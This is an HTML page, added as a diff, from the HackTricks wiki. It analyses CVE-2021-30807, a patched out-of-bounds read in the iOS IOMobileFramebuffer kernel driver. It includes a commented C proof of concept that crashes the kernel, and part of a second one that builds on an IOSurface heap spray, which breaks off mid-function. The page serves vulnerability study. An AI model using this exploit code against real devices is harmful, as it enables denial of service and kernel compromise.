@@ -1,0 +1,627 @@
+<!DOCTYPE HTML>
+
+<html class="hacktricks-light sidebar-visible" dir="ltr" lang="en">
+<head>
+<!-- Book generated using mdBook -->
+<meta charset="utf-8"/>
+<title>ios CVE-2021-30807-IOMobileFrameBuffer - HackTricks</title>
+<!-- Custom HTML head -->
+<meta content="Saar Amar’s writeup provides the full analysis; the following is a concise summary. [1]" name="description"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="#ffffff" name="theme-color"/>
+<link href="../../favicon.svg" rel="icon"/>
+<link href="../../favicon.png" rel="shortcut icon"/>
+<link href="../../css/variables.css" rel="stylesheet"/>
+<link href="../../css/general.css" rel="stylesheet"/>
+<link href="../../css/chrome.css" rel="stylesheet"/>
+<!-- Fonts -->
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
+<!-- Highlight.js Stylesheets -->
+<link href="../../highlight.css" rel="stylesheet"/>
+<link href="../../tomorrow-night.css" rel="stylesheet"/>
+<link href="../../ayu-highlight.css" rel="stylesheet"/>
+<!-- Custom theme stylesheets -->
+<link href="../../theme/tabs.css" rel="stylesheet"/>
+<link href="../../theme/pagetoc.css" rel="stylesheet"/>
+<link href="../../theme/discount.css" rel="stylesheet"/>
+<!-- Provide site root to javascript -->
+
+<!-- Start loading toc.js asap -->
+
+<!-- HT_SEO_START -->
+<link href="https://hacktricks.wiki/en/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" rel="canonical"/>
+<link href="https://hacktricks.wiki/af/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="af" rel="alternate"/>
+<link href="https://hacktricks.wiki/de/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="de" rel="alternate"/>
+<link href="https://hacktricks.wiki/el/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="el" rel="alternate"/>
+<link href="https://hacktricks.wiki/en/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="en" rel="alternate"/>
+<link href="https://hacktricks.wiki/es/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="es" rel="alternate"/>
+<link href="https://hacktricks.wiki/fr/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="fr" rel="alternate"/>
+<link href="https://hacktricks.wiki/hi/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="hi" rel="alternate"/>
+<link href="https://hacktricks.wiki/it/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="it" rel="alternate"/>
+<link href="https://hacktricks.wiki/ja/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="ja" rel="alternate"/>
+<link href="https://hacktricks.wiki/ko/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="ko" rel="alternate"/>
+<link href="https://hacktricks.wiki/pl/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="pl" rel="alternate"/>
+<link href="https://hacktricks.wiki/pt/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="pt" rel="alternate"/>
+<link href="https://hacktricks.wiki/sr/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="sr" rel="alternate"/>
+<link href="https://hacktricks.wiki/sw/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="sw" rel="alternate"/>
+<link href="https://hacktricks.wiki/tr/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="tr" rel="alternate"/>
+<link href="https://hacktricks.wiki/uk/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="uk" rel="alternate"/>
+<link href="https://hacktricks.wiki/zh/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="zh" rel="alternate"/>
+<link href="https://hacktricks.wiki/en/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="x-default" rel="alternate"/>
+<meta content="HackTricks" property="og:site_name"/>
+<meta content="ios CVE-2021-30807-IOMobileFrameBuffer - HackTricks" property="og:title"/>
+<meta content="Saar Amar’s writeup provides the full analysis; the following is a concise summary. [1]" property="og:description"/>
+<meta content="https://hacktricks.wiki/en/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" property="og:url"/>
+<meta content="website" property="og:type"/>
+<meta content="https://hacktricks.wiki/en/images/HACKTRICKS-logo.svg" property="og:image"/>
+<meta content="https://hacktricks.wiki/en/images/HACKTRICKS-logo.svg" property="og:image:secure_url"/>
+<meta content="image/svg+xml" property="og:image:type"/>
+<meta content="HackTricks" property="og:image:alt"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="summary_large_image" name="twitter:card"/>
+<meta content="ios CVE-2021-30807-IOMobileFrameBuffer - HackTricks" name="twitter:title"/>
+<meta content="Saar Amar’s writeup provides the full analysis; the following is a concise summary. [1]" name="twitter:description"/>
+<meta content="https://hacktricks.wiki/en/images/HACKTRICKS-logo.svg" name="twitter:image"/>
+
+<!-- HT_SEO_END -->
+</head>
+<body>
+<div id="body-container">
+<div aria-hidden="true" class="bg-animation"></div>
+<div aria-hidden="true" class="grid-overlay"></div>
+<div aria-hidden="true" class="particles"></div>
+<!-- Work around some values being stored in localStorage wrapped in quotes -->
+
+<!-- Set the theme before any content is loaded, prevents flash -->
+
+<input class="hidden" id="sidebar-toggle-anchor" type="checkbox"/>
+<!-- Hide / unhide sidebar before it is displayed -->
+
+<div class="page-wrapper" id="page-wrapper">
+<div class="hidden" id="search-wrapper">
+<div id="search-modal">
+<form class="searchbar-outer" id="searchbar-outer">
+<span class="fa fa-search"></span>
+<input aria-controls="searchresults-outer" aria-describedby="searchresults-header" id="searchbar" name="searchbar" placeholder="Search this book ..." type="search"/>
+</form>
+<div class="searchresults-outer hidden" id="searchresults-outer">
+<div class="searchresults-header" id="searchresults-header"></div>
+<ul id="searchresults">
+</ul>
+</div>
+</div>
+</div>
+<div class="page">
+<div id="menu-bar-hover-placeholder"></div>
+<div class="menu-bar sticky" id="menu-bar">
+<div class="menu-bar-container">
+<div class="left-buttons">
+<label aria-controls="sidebar" aria-label="Toggle Table of Contents" class="icon-button" for="sidebar-toggle-anchor" id="sidebar-toggle" title="Toggle Table of Contents">
+<i class="fa fa-bars"></i>
+</label>
+<a href="/">
+<h1 class="menu-title">
+<img alt="" aria-hidden="true" class="menu-title-logo" src="../../../../../images/HACKTRICKS-logo.svg"/>
+                                    HackTricks
+                                </h1>
+</a>
+<a class="menu-bar-link menu-bar-link-update-ai" data-research-request-link="true" href="https://tools.hacktricks.wiki/hacktricks-research-request/index.html" rel="noopener noreferrer" target="_blank">Update page with AI</a>
+</div>
+<div class="right-buttons">
+<div id="menubar-collapse">
+<a class="menu-bar-link" href="https://hacktricks-training.com" target="_blank">
+                                    HT Training
+                                </a>
+<a class="menu-bar-link" href="https://cloud.hacktricks.wiki/" target="_blank">
+                                    HT Cloud
+                                </a>
+<a class="menu-bar-link" href="https://tools.hacktricks.wiki/" target="_blank">
+                                    HT Tools
+                                </a>
+<a class="menu-bar-link" href="https://friends.hacktricks.wiki/" target="_blank">
+                                    HT Friends
+                                </a>
+</div>
+<div class="icons">
+<div aria-controls="collapse" aria-expanded="false" aria-label="Toggle Menu bar" class="icon-button" id="menubar-collapse-toggle" title="Toggle menu bar" type="button">
+<span aria-hidden="true" class="menu-hamburger">≡</span>
+<div aria-label="Menu" class="menubar-collapse-popup" id="menubar-collapse-popup" role="menu">
+<a class="menu-bar-link menu-bar-link-update-ai" data-research-request-link="true" href="https://tools.hacktricks.wiki/hacktricks-research-request/index.html" rel="noopener noreferrer" role="menuitem" target="_blank">Update page with AI</a>
+<a class="menu-bar-link" href="https://hacktricks-training.com" role="menuitem" target="_blank">HT Training</a>
+<a class="menu-bar-link" href="https://cloud.hacktricks.wiki/" role="menuitem" target="_blank">Cloud HT</a>
+<a class="menu-bar-link" href="https://tools.hacktricks.wiki/" role="menuitem" target="_blank">HT Tools</a>
+<a class="menu-bar-link" href="https://friends.hacktricks.wiki/" role="menuitem" target="_blank">HT Friends</a>
+<button class="menu-bar-link menu-action" data-toggle-translations="true" role="menuitem" type="button">
+<span>Translations</span> ▾
+                                        </button>
+<button class="menu-bar-link menu-action" data-toggle-search="true" role="menuitem" type="button">
+<span aria-hidden="true" class="menu-icon">🔍</span>
+<span>Search</span>
+</button>
+<div aria-label="Theme toggle" class="menu-theme-toggle" role="group">
+<button aria-label="Light theme" class="menu-theme-btn" data-theme-toggle="hacktricks-light" type="button">
+<span aria-hidden="true" class="menu-icon">☀</span>
+</button>
+<button aria-label="Dark theme" class="menu-theme-btn" data-theme-toggle="hacktricks-dark" type="button">
+<span aria-hidden="true" class="menu-icon">☾</span>
+</button>
+</div>
+</div>
+</div>
+<div aria-controls="translations" aria-expanded="false" aria-label="Toggle Tanslations" class="icon-button" id="menubar-languages-toggle" title="Translations" type="button">
+<i class="fa fa-globe"></i>
+<span class="menu-bar-link">Translations</span>
+<span aria-hidden="true" class="translations-caret">▾</span>
+<div aria-label="Language menu" class="menubar-languages-popup" id="menubar-languages-popup" role="language menu">
+<a class="menu-bar-link" href="/af/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="af" id="af" lang="af" role="menuitem">🇿🇦 Afrikaans</a>
+<a class="menu-bar-link" href="/zh/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="zh" id="zh" lang="zh" role="menuitem">🇨🇳 Chinese</a>
+<a class="menu-bar-link" href="/en/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="en" id="en" lang="en" role="menuitem">🇬🇧 English</a>
+<a class="menu-bar-link" href="/fr/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="fr" id="fr" lang="fr" role="menuitem">🇫🇷 French</a>
+<a class="menu-bar-link" href="/de/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="de" id="de" lang="de" role="menuitem">🇩🇪 German</a>
+<a class="menu-bar-link" href="/el/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="el" id="el" lang="el" role="menuitem">🇬🇷 Greek</a>
+<a class="menu-bar-link" href="/hi/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="hi" id="hi" lang="hi" role="menuitem">🇮🇳 Hindi</a>
+<a class="menu-bar-link" href="/it/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="it" id="it" lang="it" role="menuitem">🇮🇹 Italian</a>
+<a class="menu-bar-link" href="/ja/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="ja" id="ja" lang="ja" role="menuitem">🇯🇵 Japanese</a>
+<a class="menu-bar-link" href="/ko/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="ko" id="ko" lang="ko" role="menuitem">🇰🇷 Korean</a>
+<a class="menu-bar-link" href="/pl/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="pl" id="pl" lang="pl" role="menuitem">🇵🇱 Polish</a>
+<a class="menu-bar-link" href="/pt/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="pt" id="pt" lang="pt" role="menuitem">🇵🇹 Portuguese</a>
+<a class="menu-bar-link" href="/sr/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="sr" id="sr" lang="sr" role="menuitem">🇷🇸 Serbian</a>
+<a class="menu-bar-link" href="/es/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="es" id="es" lang="es" role="menuitem">🇪🇸 Spanish</a>
+<a class="menu-bar-link" href="/sw/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="sw" id="sw" lang="sw" role="menuitem">🇹🇿 Swahili</a>
+<a class="menu-bar-link" href="/tr/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="tr" id="tr" lang="tr" role="menuitem">🇹🇷 Turkish</a>
+<a class="menu-bar-link" href="/uk/binary-exploitation/ios-exploiting/CVE-2021-30807-IOMobileFrameBuffer.html" hreflang="uk" id="uk" lang="uk" role="menuitem">🇺🇦 Ukrainian</a>
+</div>
+</div>
+<button aria-controls="searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-label="Toggle Searchbar" class="icon-button" id="search-toggle" title="Search. (Shortkey: s)" type="button">
+<i class="fa fa-search"></i>
+</button>
+<label aria-label="Open Table of Contents" class="icon-button mobile-toc-toggle" for="sidebar-toggle-anchor" id="mobile-toc-toggle" title="Open Table of Contents">
+<span aria-hidden="true" class="mobile-toc-icon">📚</span>
+</label>
+</div>
+<div class="theme-wrapper theme-wrapper--menubar" id="theme-wrapper">
+<div class="theme-btns" id="theme-btns">
+<button aria-checked="false" aria-label="Switch to light theme" class="theme" id="hacktricks-light" role="radio" type="button">
+<i class="fa fa-sun-o"></i>
+</button>
+<button aria-checked="false" aria-label="Switch to dark theme" class="theme theme-selected" id="hacktricks-dark" role="radio" type="button">
+<i class="fa fa-moon-o"></i>
+</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="container" id="container">
+<label aria-label="Toggle book table of contents" class="sidebar-float-toggle" for="sidebar-toggle-anchor" id="sidebar-float-toggle" title="Toggle book table of contents">
+<span aria-hidden="true" class="toggle-chevron">&lt;&lt;</span>
+</label>
+
+<!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+
+<div class="content" id="content">
+<main>
+<div aria-hidden="true" class="topsponsor-bsa">
+<div id="bsa-zone_1773736844679-9_123456"></div>
+</div>
+<a class="topsponsor ht-sponsor-card ht-sponsor-card--horizontal" href="" rel="noopener noreferrer" target="_blank">
+<span aria-hidden="true" class="ht-sponsor-grid"></span>
+<span aria-hidden="true" class="ht-sponsor-scan"></span>
+<span aria-hidden="true" class="ht-sponsor-corners"></span>
+<span class="ht-sponsor-kicker">Sponsored</span>
+<span class="ht-sponsor-media">
+<img alt="" src="" srcset=""/>
+</span>
+<span class="ht-sponsor-copy">
+<span class="topsponsor-title ht-sponsor-title"></span>
+<span class="topsponsor-description ht-sponsor-description"></span>
+</span>
+<span class="topsponsor-cta ht-sponsor-cta"></span>
+</a>
+<h1 id="cve-2021-30807-iomobileframebuffer-oob"><a class="header" href="#cve-2021-30807-iomobileframebuffer-oob">CVE-2021-30807: IOMobileFrameBuffer OOB</a></h1>
+<blockquote class="blockquote-tag blockquote-tag-tip">
+<p class="blockquote-tag-title">Tip</p>
+<p>Learn &amp; practice AWS Hacking:<img alt="" src="../../../../../images/arte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><a href="https://hacktricks-training.com/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img alt="" src="../../../../../images/arte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><br/>Learn &amp; practice GCP Hacking: <img alt="" src="../../../../../images/grte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><a href="https://hacktricks-training.com/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong></a><img alt="" src="../../../../../images/grte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><br/>Learn &amp; practice Az Hacking: <img alt="" src="../../../../../images/azrte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><a href="https://hacktricks-training.com/courses/azrte"><strong>HackTricks Training Azure Red Team Expert (AzRTE)</strong></a><img alt="" src="../../../../../images/azrte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><br/>Browse the <a href="https://hacktricks-training.com/courses/"><strong>full HackTricks Training catalog</strong></a>.</p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a>, the <a href="https://t.me/peass"><strong>telegram group</strong></a>, <strong>follow</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a> on <strong>X/Twitter</strong>, or check the <a href="https://www.linkedin.com/company/hacktricks/"><strong>LinkedIn page</strong></a> and <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>YouTube channel</strong></a>.</li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+</blockquote>
+<h2 id="the-bug"><a class="header" href="#the-bug">The Bug</a></h2>
+<p>Saar Amar’s writeup provides the full analysis; the following is a concise summary.<sup><a href="#references">[1]</a></sup></p>
+<ul>
+<li>
+<p>The vulnerable code path is <strong>external method #83</strong> of the <strong>IOMobileFramebuffer / AppleCLCD</strong> user client: <code>IOMobileFramebufferUserClient::s_displayed_fb_surface(...)</code>. It receives a user-controlled parameter without validating it and forwards that value as <strong><code>scalar0</code></strong>.</p>
+</li>
+<li>
+<p>That method forwards into <strong><code>IOMobileFramebufferLegacy::get_displayed_surface(this, task*, out_id, scalar0)</code></strong>, where <strong><code>scalar0</code></strong> (a user-controlled <strong>32-bit</strong> value) is used as an <strong>index</strong> into an internal <strong>array of pointers</strong> without <strong>any bounds check</strong>:<sup><a href="#references">[4]</a></sup></p>
+<blockquote>
+<p><code>ptr = *(this + 0xA58 + scalar0 * 8);</code> → passed to <code>IOSurfaceRoot::copyPortNameForSurfaceInTask(...)</code> as an <strong><code>IOSurface*</code></strong>.<br/><strong>Result:</strong> <strong>OOB pointer read &amp; type confusion</strong> on that array. If the pointer isn’t valid, the kernel deref panics → <strong>DoS</strong>.</p>
+</blockquote>
+</li>
+</ul>
+<blockquote class="blockquote-tag blockquote-tag-note">
+<p class="blockquote-tag-title">Note</p>
+<p>This was fixed in <strong>iOS/iPadOS 14.7.1</strong>, <strong>macOS Big Sur 11.5.1</strong>, <strong>watchOS 7.6.1</strong><sup><a href="#references">[3]</a></sup></p>
+</blockquote>
+<blockquote class="blockquote-tag blockquote-tag-warning">
+<p class="blockquote-tag-title">Warning</p>
+<p>The initial function to call <code>IOMobileFramebufferUserClient::s_displayed_fb_surface(...)</code> is protected by the entitlement <strong><code>com.apple.private.allow-explicit-graphics-priority</code></strong>. However, <strong>WebKit.WebContent</strong> has this entitlement, so it can be used to trigger the vuln from a sandboxed process.<sup><a href="#references">[1]</a></sup></p>
+</blockquote>
+<h2 id="dos-poc"><a class="header" href="#dos-poc">DoS PoC</a></h2>
+<p>The following is the initial denial-of-service PoC from the original blog post, with extra comments:<sup><a href="#references">[1]</a></sup></p>
+<pre><code class="language-c">// PoC for CVE-2021-30807 trigger (annotated)
+// NOTE: This demonstrates the crash trigger; it is NOT an LPE.
+// Build/run only on devices you own and that are vulnerable.
+// Patched in iOS/iPadOS 14.7.1, macOS 11.5.1, watchOS 7.6.1.  (Apple advisory)
+// https://support.apple.com/en-us/103144
+// https://nvd.nist.gov/vuln/detail/CVE-2021-30807
+
+void trigger_clcd_vuln(void) {
+  kern_return_t ret;
+  io_connect_t shared_user_client_conn = MACH_PORT_NULL;
+
+  // The "type" argument is the type (selector) of user client to open.
+  // For IOMobileFramebuffer, 2 typically maps to a user client that exposes the
+  // external methods we need (incl. selector 83). If this doesn't work on your
+  // build, try different types or query IORegistry to enumerate.
+  int type = 2;
+
+  // 1) Locate the IOMobileFramebuffer service in the IORegistry.
+  //    This returns the first matched service object (a kernel object handle).
+  io_service_t service = IOServiceGetMatchingService(
+      kIOMasterPortDefault,
+      IOServiceMatching("IOMobileFramebuffer"));
+
+  if (service == MACH_PORT_NULL) {
+    printf("failed to open service\n");
+    return;
+  }
+
+  printf("service: 0x%x\n", service);
+
+  // 2) Open a connection (user client) to the service.
+  //    The user client is what exposes external methods to userland.
+  //    'type' selects which user client class/variant to instantiate.
+  ret = IOServiceOpen(service, mach_task_self(), type, &amp;shared_user_client_conn);
+  if (ret != KERN_SUCCESS) {
+    printf("failed to open userclient: %s\n", mach_error_string(ret));
+    return;
+  }
+
+  printf("client: 0x%x\n", shared_user_client_conn);
+
+  printf("call externalMethod\n");
+
+  // 3) Prepare input scalars for the external method call.
+  //    The vulnerable path uses a 32-bit scalar as an INDEX into an internal
+  //    array of pointers WITHOUT bounds checking (OOB read / type confusion).
+  //    We set it to a large value to force the out-of-bounds access.
+  uint64_t scalars[4] = { 0x0 };
+  scalars[0] = 0x41414141; // **Attacker-controlled index** → OOB pointer lookup
+
+  // 4) Prepare output buffers (the method returns a scalar, e.g. a surface ID).
+  uint64_t output_scalars[4] = { 0 };
+  uint32_t output_scalars_size = 1;
+
+  printf("call s_default_fb_surface\n");
+
+  // 5) Invoke external method #83.
+  //    On vulnerable builds, this path ends up calling:
+  //      IOMobileFramebufferUserClient::s_displayed_fb_surface(...)
+  //      → IOMobileFramebufferLegacy::get_displayed_surface(...)
+  //      which uses our index to read a pointer and then passes it as IOSurface*.
+  //    If the pointer is bogus, IOSurface code will dereference it and the kernel
+  //    will panic (DoS).
+  ret = IOConnectCallMethod(
+          shared_user_client_conn,
+          83,                 // **Selector 83**: vulnerable external method
+          scalars, 1,         // input scalars (count = 1; the OOB index)
+          NULL, 0,            // no input struct
+          output_scalars, &amp;output_scalars_size,  // optional outputs
+          NULL, NULL);        // no output struct
+
+  // 6) Check the call result. On many vulnerable targets, you'll see either
+  //    KERN_SUCCESS right before a panic (because the deref happens deeper),
+  //    or an error if the call path rejects the request (e.g., entitlement/type).
+  if (ret != KERN_SUCCESS) {
+    printf("failed to call external method: 0x%x --&gt; %s\n",
+           ret, mach_error_string(ret));
+    return;
+  }
+
+  printf("external method returned KERN_SUCCESS\n");
+
+  // 7) Clean up the user client connection handle.
+  IOServiceClose(shared_user_client_conn);
+  printf("success!\n");
+}
+</code></pre>
+<h2 id="arbitrary-read-poc-explained"><a class="header" href="#arbitrary-read-poc-explained">Arbitrary Read PoC Explained</a></h2>
+<ol>
+<li><strong>Opening the right user client</strong></li>
+</ol>
+<ul>
+<li><code>get_appleclcd_uc()</code> finds the <strong>AppleCLCD</strong> service and opens <strong>user client type 2</strong>. AppleCLCD and IOMobileFramebuffer share the same external-methods table; type 2 exposes <strong>selector 83</strong>, the vulnerable method. <strong>This is your entry to the bug.</strong> E_POC/)</li>
+</ul>
+<p><strong>Why 83 matters:</strong> the decompiled path is:</p>
+<ul>
+<li><code>IOMobileFramebufferUserClient::s_displayed_fb_surface(...)</code><br/>→ <code>IOMobileFramebufferUserClient::get_displayed_surface(...)</code><br/>→ <code>IOMobileFramebufferLegacy::get_displayed_surface(...)</code><br/>Inside that last call, the code <strong>uses your 32-bit scalar as an array index with no bounds check</strong>, fetches a pointer from <strong><code>this + 0xA58 + index*8</code></strong>, and <strong>passes it as an <code>IOSurface*</code></strong> to <code>IOSurfaceRoot::copyPortNameForSurfaceInTask(...)</code>. <strong>That’s the OOB + type confusion.</strong><sup><a href="#references">[1]</a></sup></li>
+</ul>
+<ol start="2">
+<li><strong>The heap spray (why IOSurface shows up here)</strong></li>
+</ol>
+<ul>
+<li>
+<p><code>do_spray()</code> uses <strong><code>IOSurfaceRootUserClient</code></strong> to <strong>create many IOSurfaces</strong> and <strong>spray small values</strong> (<code>s_set_value</code> style). This fills nearby kernel heaps with <strong>pointers to valid IOSurface objects</strong>.</p>
+</li>
+<li>
+<p><strong>Goal:</strong> when selector 83 reads past the legit table, the <strong>OOB slot likely contains a pointer to one of your (real) IOSurfaces</strong>—so the later dereference <strong>doesn’t crash</strong> and <strong>succeeds</strong>. IOSurface is a classic, well-documented kernel spray primitive, and Saar’s post explicitly lists the <strong>create / set_value / lookup</strong> methods used for this exploitation flow.<sup><a href="#references">[1]</a></sup></p>
+</li>
+</ul>
+<ol start="3">
+<li><strong>The “offset/8” trick (what that index really is)</strong></li>
+</ol>
+<ul>
+<li>
+<p>In <code>trigger_oob(offset)</code>, you set <code>scalars[0] = offset / 8</code>.</p>
+</li>
+<li>
+<p><strong>Why divide by 8?</strong> The kernel does <strong><code>base + index*8</code></strong> to compute which <strong>pointer-sized slot</strong> to read. You’re picking <strong>“slot number N”</strong>, not a byte offset. <strong>Eight bytes per slot</strong> on 64-bit.<sup><a href="#references">[1]</a></sup></p>
+</li>
+<li>
+<p>That computed address is <strong><code>this + 0xA58 + index*8</code></strong>. The PoC uses a big constant (<code>0x1200000 + 0x1048</code>) simply to step <strong>far out of bounds</strong> into a region you’ve tried to <strong>densely populate with IOSurface pointers</strong>. <strong>If the spray “wins,” the slot you hit is a valid <code>IOSurface*</code>.</strong><sup><a href="#references">[1]</a></sup></p>
+</li>
+</ul>
+<ol start="4">
+<li><strong>What selector 83 returns (this is the subtle part)</strong></li>
+</ol>
+<ul>
+<li>
+<p>The call is:</p>
+<p><code>IOConnectCallMethod(appleclcd_uc, 83, scalars, 1, NULL, 0,                     output_scalars, &amp;output_scalars_size, NULL, NULL);</code></p>
+</li>
+<li>
+<p>Internally, after the OOB pointer fetch, the driver calls<br/><strong><code>IOSurfaceRoot::copyPortNameForSurfaceInTask(task, IOSurface*, out_u32*)</code></strong>.</p>
+</li>
+<li>
+<p><strong>Result:</strong> <strong><code>output_scalars[0]</code> is a Mach port name (u32 handle) in your task</strong> for <em>whatever object pointer you supplied via OOB</em>. <strong>It is not a raw kernel address leak; it’s a userspace handle (send right).</strong> This exact behavior (copying a <em>port name</em>) is shown in Saar’s decompilation.<sup><a href="#references">[1]</a></sup></p>
+</li>
+</ul>
+<p><strong>Why that’s useful:</strong> with a <strong>port name</strong> to the (supposed) IOSurface, you can now use <strong>IOSurfaceRoot methods</strong> like:</p>
+<ul>
+<li>
+<p><strong><code>s_lookup_surface_from_port</code> (method 34)</strong> → turn the port into a <strong>surface ID</strong> you can operate on through other IOSurface calls, and</p>
+</li>
+<li>
+<p><strong><code>s_create_port_from_surface</code> (method 35)</strong> if you need the inverse.<br/>Saar calls out these exact methods as the next step. <strong>The PoC is proving you can “manufacture” a legitimate IOSurface handle from an OOB slot.</strong> <a href="https://saaramar.github.io/IOMobileFrameBuffer_LPE_POC/">Saaramar</a><sup><a href="#references">[1]</a></sup></p>
+</li>
+</ul>
+<p>The following PoC comes from Saar Amar’s repository, with additional comments explaining its steps:<sup><a href="#references">[2]</a></sup><sup><a href="#references">[5]</a></sup></p>
+<pre><code class="language-c">#include "exploit.h"
+
+// Open the AppleCLCD (aka IOMFB) user client so we can call external methods.
+io_connect_t get_appleclcd_uc(void) {
+    kern_return_t ret;
+    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
+    int type = 2; // **UserClient type**: variant that exposes selector 83 on affected builds.  ⭐
+                  // (AppleCLCD and IOMobileFramebuffer share the same external methods table.)
+
+    // Find the **AppleCLCD** service in the IORegistry.
+    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                       IOServiceMatching("AppleCLCD"));
+    if(service == MACH_PORT_NULL) {
+        printf("[-] failed to open service\n");
+        return MACH_PORT_NULL;
+    }
+    printf("[*] AppleCLCD service: 0x%x\n", service);
+
+    // Open a user client connection to AppleCLCD with the chosen **type**.
+    ret = IOServiceOpen(service, mach_task_self(), type, &amp;shared_user_client_conn);
+    if(ret != KERN_SUCCESS) {
+        printf("[-] failed to open userclient: %s\n", mach_error_string(ret));
+        return MACH_PORT_NULL;
+    }
+    printf("[*] AppleCLCD userclient: 0x%x\n", shared_user_client_conn);
+    return shared_user_client_conn;
+}
+
+// Trigger the OOB index path of external method #83.
+// The 'offset' you pass is in bytes; dividing by 8 converts it to the
+// index of an 8-byte pointer slot in the internal table at (this + 0xA58).
+uint64_t trigger_oob(uint64_t offset) {
+    kern_return_t ret;
+
+    // The method takes a single 32-bit scalar that it uses as an index.
+    uint64_t scalars[1] = { 0x0 };
+    scalars[0] = offset / 8;   // **index = byteOffset / sizeof(void*)**.  ⭐
+
+    // #83 returns one scalar. In this flow it will be the Mach port name
+    // (a u32 handle in our task), not a kernel pointer.
+    uint64_t output_scalars[1] = { 0 };
+    uint32_t output_scalars_size = 1;
+
+    io_connect_t appleclcd_uc = get_appleclcd_uc();
+    if (appleclcd_uc == MACH_PORT_NULL) {
+        return 0;
+    }
+
+    // Call external method 83. Internally:
+    //   ptr = *(this + 0xA58 + index*8);         // OOB pointer fetch
+    //   IOSurfaceRoot::copyPortNameForSurfaceInTask(task, (IOSurface*)ptr, &amp;out)
+    // which creates a send right for that object and writes its port name
+    // into output_scalars[0]. If ptr is junk → deref/panic (DoS).
+    ret = IOConnectCallMethod(appleclcd_uc, 83,
+                                    scalars, 1,
+                                    NULL, 0,
+                                    output_scalars, &amp;output_scalars_size,
+                                    NULL, NULL);
+
